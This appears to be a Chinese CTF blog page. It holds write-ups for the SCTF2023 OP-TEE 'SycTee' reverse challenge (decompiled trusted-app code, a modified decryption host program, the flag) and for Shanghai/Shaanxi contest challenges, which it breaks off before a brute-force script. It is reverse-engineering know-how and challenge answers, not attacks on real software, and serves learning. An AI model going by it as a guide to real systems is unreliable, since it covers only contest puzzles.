class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;TEE failed, %x&quot;</span>, v11);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              v11 = sub_3DC0(*((_QWORD *)a1 + <span class="number">2</span>), *((_QWORD *)a1 + <span class="number">3</span>));</span><br><span class="line">              <span class="keyword">if</span> ( !v11 )</span><br><span class="line">                <span class="keyword">return</span> v11;</span><br><span class="line">              sub_930(<span class="string">&quot;alloc_resources&quot;</span>, <span class="number">204LL</span>, <span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;TEE failed %x&quot;</span>, v11);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            v11 = <span class="number">-65524</span>;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *((_QWORD *)a1 + <span class="number">2</span>) )</span><br><span class="line">        sub_3018();</span><br><span class="line">      v12 = *((_QWORD *)a1 + <span class="number">3</span>);</span><br><span class="line">      *((_QWORD *)a1 + <span class="number">2</span>) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">if</span> ( v12 )</span><br><span class="line">        sub_2400();</span><br><span class="line">      *((_QWORD *)a1 + <span class="number">3</span>) = <span class="number">0LL</span>;</span><br><span class="line">      <span class="keyword">return</span> v11;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">      sub_930(<span class="string">&quot;set_bj888_key&quot;</span>, <span class="number">240LL</span>, <span class="number">3LL</span>, <span class="number">1LL</span>, <span class="string">&quot;Session %p: load &quot;</span>, a1);</span><br><span class="line">      <span class="keyword">if</span> ( a3 != <span class="number">5</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">-65530</span>;</span><br><span class="line">      v15 = *((_DWORD *)a4 + <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v15 != a1[<span class="number">2</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_930(<span class="string">&quot;set_bj888_key&quot;</span>, <span class="number">251LL</span>, <span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;Wrong size %u, expect %u bytes&quot;</span>, v15);</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">-65530</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ((<span class="type">void</span> (*)(<span class="type">void</span>))sub_2578)();</span><br><span class="line">      sub_2454(*((_QWORD *)a1 + <span class="number">3</span>));</span><br><span class="line">      v16 = sub_24A8(*((_QWORD *)a1 + <span class="number">3</span>), v23, <span class="number">1LL</span>);</span><br><span class="line">      v11 = v16;</span><br><span class="line">      <span class="keyword">if</span> ( v16 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_930(<span class="string">&quot;set_bj888_key&quot;</span>, <span class="number">280LL</span>, <span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;TEE failed, %x&quot;</span>, v16);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        sub_3D48(*((_QWORD *)a1 + <span class="number">2</span>));</span><br><span class="line">        v17 = sub_3DC0(*((_QWORD *)a1 + <span class="number">2</span>), *((_QWORD *)a1 + <span class="number">3</span>));</span><br><span class="line">        v11 = v17;</span><br><span class="line">        <span class="keyword">if</span> ( v17 )</span><br><span class="line">          sub_930(<span class="string">&quot;set_bj888_key&quot;</span>, <span class="number">287LL</span>, <span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;TEE failed %x&quot;</span>, v17);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> v11;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">      sub_930(<span class="string">&quot;reset_bj888_iv&quot;</span>, <span class="number">310LL</span>, <span class="number">3LL</span>, <span class="number">1LL</span>, <span class="string">&quot;Session %p: no hint&quot;</span>, a1);</span><br><span class="line">      <span class="keyword">if</span> ( a3 != <span class="number">5</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">-65530</span>;</span><br><span class="line">      sub_42E4(*((_QWORD *)a1 + <span class="number">2</span>), *a4, *((<span class="type">unsigned</span> <span class="type">int</span> *)a4 + <span class="number">2</span>));</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">      sub_930(<span class="string">&quot;cipher_buffer&quot;</span>, <span class="number">344LL</span>, <span class="number">3LL</span>, <span class="number">1LL</span>, <span class="string">&quot;Session %p: no hints&quot;</span>, a1);</span><br><span class="line">      <span class="keyword">if</span> ( a3 != <span class="number">101</span> )</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">-65530</span>;</span><br><span class="line">      v18 = *((_DWORD *)a4 + <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( *((_DWORD *)a4 + <span class="number">6</span>) &lt; v18 )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_930(<span class="string">&quot;cipher_buffer&quot;</span>, <span class="number">352LL</span>, <span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot;Bad sizes: in %d, out %d&quot;</span>, v18);</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">-65530</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v19 = *((_QWORD *)a1 + <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( !v19 )</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">-65529</span>;</span><br><span class="line">      sub_43C4(v19, *a4);</span><br><span class="line">      v20 = a4[<span class="number">2</span>];</span><br><span class="line">      v21 = sub_20(v23, &amp;unk_11AFA, <span class="number">27LL</span>);</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">0LL</span>; i != <span class="number">27</span>; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(<span class="type">unsigned</span> __int8 *)(v21 + i) != *(<span class="type">unsigned</span> __int8 *)(v20 + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          sub_1E10(*a4, <span class="string">&quot;wrong&quot;</span>, <span class="number">6LL</span>);</span><br><span class="line">          sub_1FD8(<span class="string">&quot;wrong&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)<span class="number">-65530</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      sub_1E10(*a4, <span class="string">&quot;right&quot;</span>, <span class="number">6LL</span>);</span><br><span class="line">      sub_1FD8(<span class="string">&quot;right&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      v11 = <span class="number">-65526</span>;</span><br><span class="line">      sub_930(<span class="string">&quot;TA_InvokeCommandEntryPoint&quot;</span>, <span class="number">452LL</span>, <span class="number">1LL</span>, <span class="number">1LL</span>, <span class="string">&quot; 0x%x is not supported&quot;</span>, a2);</span><br><span class="line">      <span class="keyword">return</span> v11;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到主要逻辑是获取key和iv然后进行加密，再对比。如果有手动构建过optee的话，这个其实就是内置的aes的ctr加密魔改过来的，加密并没有魔改，只是将key和iv初始化在了host，下面可以直接用在线网站跑出结果：</p>
<p><img src="/2023/06/21/SCTF2023%E9%80%86%E5%90%91SycTee%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/.%5CSCTF2023%5C1.png" alt="1"></p>
<p>当然，最好的方法是修改optee_example_aes文件中host目录下的main：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">test_ctx</span> <span class="title">ctx</span>;</span></span><br><span class="line">	<span class="type">char</span> key[AES_TEST_KEY_SIZE]=<span class="string">&quot;snbjklefsdcvfsyc&quot;</span>;</span><br><span class="line">	<span class="type">char</span> iv[AES_BLOCK_SIZE]=<span class="string">&quot;snbjklefsdcvfsyc&quot;</span>;</span><br><span class="line">	<span class="type">char</span> clear[AES_TEST_BUFFER_SIZE];</span><br><span class="line">	<span class="type">char</span> ciph[AES_TEST_BUFFER_SIZE]=&#123;<span class="number">0x25</span>, <span class="number">0x03</span>, <span class="number">0x0A</span>, <span class="number">0x6C</span>, <span class="number">0xF8</span>,</span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0xCE</span>, <span class="number">0x7F</span>, <span class="number">0xC9</span>, <span class="number">0x42</span>, <span class="number">0x0C</span>, <span class="number">0x0D</span>, <span class="number">0x68</span>, <span class="number">0xB3</span>, <span class="number">0x1C</span>, <span class="number">0x04</span>, </span><br><span class="line">  <span class="number">0x64</span>, <span class="number">0xFA</span>, <span class="number">0xE5</span>, <span class="number">0xA4</span>, <span class="number">0x22</span>, <span class="number">0xD4</span>, <span class="number">0x2C</span>, <span class="number">0xFF</span>, <span class="number">0x4E</span>, <span class="number">0x36</span>, <span class="number">0x2A</span>&#125;;</span><br><span class="line">	<span class="type">char</span> temp[AES_TEST_BUFFER_SIZE];</span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;Prepare session with the TA\\n&quot;);</span></span><br><span class="line">	<span class="comment">//prepare_tee_session(&amp;ctx);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;Prepare encode operation\\n&quot;);</span></span><br><span class="line">	<span class="comment">//prepare_aes(&amp;ctx, ENCODE);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;Load key in TA\\n&quot;);</span></span><br><span class="line">	<span class="comment">//memset(key, 0xa5, sizeof(key)); /* Load some dummy value */</span></span><br><span class="line">	<span class="comment">//set_key(&amp;ctx, key, AES_TEST_KEY_SIZE);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;Reset ciphering operation in TA (provides the initial vector)\\n&quot;);</span></span><br><span class="line">	<span class="comment">//memset(iv, 0, sizeof(iv)); /* Load some dummy value */</span></span><br><span class="line">	<span class="comment">//set_iv(&amp;ctx, iv, AES_BLOCK_SIZE);</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;Encode buffer from TA\\n&quot;);</span></span><br><span class="line">	<span class="comment">//memset(clear, 0x5a, sizeof(clear)); /* Load some dummy value */</span></span><br><span class="line">	<span class="comment">//cipher_buffer(&amp;ctx, clear, ciph, AES_TEST_BUFFER_SIZE);</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Prepare decode operation\\n&quot;</span>);</span><br><span class="line">	prepare_aes(&amp;ctx, DECODE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;Load key in TA\\n&quot;);</span></span><br><span class="line">	<span class="comment">//memset(key, 0xa5, sizeof(key)); /* Load some dummy value */</span></span><br><span class="line">	set_key(&amp;ctx, key, AES_TEST_KEY_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//printf(&quot;Reset ciphering operation in TA (provides the initial vector)\\n&quot;);</span></span><br><span class="line">	<span class="comment">//memset(iv, 0, sizeof(iv)); /* Load some dummy value */</span></span><br><span class="line">	set_iv(&amp;ctx, iv, AES_BLOCK_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Decode buffer from TA\\n&quot;</span>);</span><br><span class="line">	cipher_buffer(&amp;ctx, ciph, temp, AES_TEST_BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check decoded is the clear content */</span></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">memcmp</span>(clear, temp, AES_TEST_BUFFER_SIZE))</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Clear text and decoded text differ =&gt; ERROR\\n&quot;</span>);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Clear text and decoded text match\\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	terminate_tee_session(&amp;ctx);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后编译运行，可以直接跑出flag：sctf{T3e_not_s4f3_anym0re!}</p>
<p><img src="/2023/06/21/SCTF2023%E9%80%86%E5%90%91SycTee%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/.%5CSCTF2023%5C0.png" alt="0"></p>
<p>当然该题还可以进行动态调试，只需要把run.sh最后一行改为：</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-monitor <span class="keyword">null</span> -<span class="type">serial</span> tcp:localhost:port1 	-<span class="type">serial</span> tcp:localhost:port2 -s -S</span><br></pre></td></tr></table></figure>

<p>指定串口即可，然后run.sh运行，再用gdb连接，接下来下断点到文件加载处，便可以进行动态调试。</p>
<h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>这次出题学到了很多，在赛后也受到许多大师傅的启发，之后会让题出的更有逻辑和思路，而不是一味的堆砌。在这次出题后，在平时需要进行沉淀和思考，不能急于求成。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://jonathanbest7.github.io/2023/06/21/%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/bitbug_favicon.ico">
      <meta itemprop="name" content="bj777">
      <meta itemprop="description" content="一位逆向菜狗">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="bj777的blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/21/%E5%87%BA%E9%A2%98%E4%B8%8E%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">出题与解题思路</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-06-21 13:20:57" itemprop="dateCreated datePublished" datetime="2023-06-21T13:20:57+08:00">2023-06-21</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://jonathanbest7.github.io/2023/06/05/%E4%B8%8A%E6%B5%B7%E7%9C%81%E8%B5%9B-%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/bitbug_favicon.ico">
      <meta itemprop="name" content="bj777">
      <meta itemprop="description" content="一位逆向菜狗">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="bj777的blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/06/05/%E4%B8%8A%E6%B5%B7%E7%9C%81%E8%B5%9B-%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B/" class="post-title-link" itemprop="url">上海省赛/陕西省赛初赛</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2023-06-05 16:54:36 / 修改时间：17:12:50" itemprop="dateCreated datePublished" datetime="2023-06-05T16:54:36+08:00">2023-06-05</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="2023上海省赛："><a href="#2023上海省赛：" class="headerlink" title="2023上海省赛："></a>2023上海省赛：</h1><p>好久没写wp了，重新使用一下博客吧，re不难，但时间不是很够</p>
<h1 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h1><h2 id="flag在哪？"><a href="#flag在哪？" class="headerlink" title="flag在哪？"></a>flag在哪？</h2><p>通过搜索字符串和交叉引用，找到加密处：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_401670</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v0; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [esp+0h] [ebp-44h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4</span>]; <span class="comment">// [esp+20h] [ebp-24h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+40h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_401780();</span><br><span class="line">  sub_4026A0(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  __scrt_stub_for_initialize_mta();</span><br><span class="line">  sub_4017B0(v3);</span><br><span class="line">  sub_401840((<span class="type">char</span>)&amp;v2);</span><br><span class="line">  v4 = sub_402770(&amp;v2, v3);</span><br><span class="line">  <span class="keyword">return</span> sub_4018A0(v0, v4);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_402770</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+0h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_401C40(v2);</span><br><span class="line">  v4 = ((<span class="type">int</span> (__cdecl *)(<span class="type">int</span>, <span class="type">int</span>))Block)(a1, a2);</span><br><span class="line">  <span class="built_in">free</span>(Block);</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数是加密函数，但是需要smc一下</p>
<p><img src="/2023/06/05/%E4%B8%8A%E6%B5%B7%E7%9C%81%E8%B5%9B-%E9%99%95%E8%A5%BF%E7%9C%81%E8%B5%9B%E5%88%9D%E8%B5%9B/Untitled.png"></p>
<p>把这个地方的call nop掉可以看到函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">sub_5040A0</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">4132</span>]; <span class="comment">// [esp+0h] [ebp-1254h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v4[<span class="number">256</span>]; <span class="comment">// [esp+1024h] [ebp-230h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">256</span>]; <span class="comment">// [esp+1124h] [ebp-130h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+1224h] [ebp-30h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+1228h] [ebp-2Ch]</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// [esp+122Ch] [ebp-28h]</span></span><br><span class="line">  <span class="type">char</span> *v9; <span class="comment">// [esp+1230h] [ebp-24h]</span></span><br><span class="line">  <span class="type">char</span> *v10; <span class="comment">// [esp+1234h] [ebp-20h]</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// [esp+1238h] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">void</span> *v12; <span class="comment">// [esp+123Ch] [ebp-18h]</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [esp+1240h] [ebp-14h]</span></span><br><span class="line">  <span class="type">int</span> v14; <span class="comment">// [esp+1244h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> (__cdecl *v15)(<span class="type">int</span>); <span class="comment">// [esp+1248h] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [esp+124Ch] [ebp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+1250h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v15 = dword_4062B4;</span><br><span class="line">  v7 = dword_406448;</span><br><span class="line">  v6 = dword_40644C;</span><br><span class="line">  v14 = dword_4062B4(a1);</span><br><span class="line">  v13 = v15(a2);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v14; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[i] = *(_BYTE *)(i + a1) ^ <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i % <span class="number">3</span> == <span class="number">1</span> )</span><br><span class="line">      v5[i] ^= byte_406000[<span class="number">3</span> * i];</span><br><span class="line">  &#125;</span><br><span class="line">  v5[v14] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; v13; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v4[j] = *(_BYTE *)(j + a2) ^ <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> ( j % <span class="number">2</span> == <span class="number">1</span> )</span><br><span class="line">      v4[j] = *(_BYTE *)(j + a2 + <span class="number">7</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v4[v13] = <span class="number">0</span>;</span><br><span class="line">  v12 = v3;</span><br><span class="line">  dword_406458(v3, sub_401AC0, <span class="number">4132</span>);</span><br><span class="line">  v9 = v3;</span><br><span class="line">  v10 = v5;</span><br><span class="line">  v11 = v4;</span><br><span class="line">  v8 = v3;</span><br><span class="line">  <span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对flag进行加密，key的加密是动调获取，再看被nop掉的函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">sub_19EC64</span><span class="params">(<span class="type">char</span> *Str, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v3[<span class="number">80</span>]; <span class="comment">// [esp+0h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+50h] [ebp-28h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+54h] [ebp-24h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [esp+58h] [ebp-20h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+5Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [esp+60h] [ebp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v9; <span class="comment">// [esp+64h] [ebp-14h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v10; <span class="comment">// [esp+68h] [ebp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [esp+70h] [ebp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+74h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v10 = dword_4062B4(Str);</span><br><span class="line">  v6 = dword_4062B4(a2);</span><br><span class="line">  dword_4062B4(byte_406274);</span><br><span class="line">  v12 = <span class="number">15</span>;</span><br><span class="line">  v11 = <span class="number">15</span> - v10;</span><br><span class="line">  <span class="keyword">if</span> ( v10 != <span class="number">15</span> )</span><br><span class="line">    <span class="keyword">return</span> v11;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v10; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="number">0</span>;</span><br><span class="line">    v9 = i % <span class="number">3</span>;</span><br><span class="line">    v7 = dword_406450(i % <span class="number">3</span>);</span><br><span class="line">    v5 = (v7 + <span class="number">2</span>) ^ Str[i];</span><br><span class="line">    v8 = a2[i];</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v6 )</span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v3[i] = v8 + v5;</span><br><span class="line">    <span class="keyword">if</span> ( v3[i] != byte_406274[i] )</span><br><span class="line">      <span class="keyword">return</span> i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>很轻松的用爆破解决问题：下面是脚本：</p>
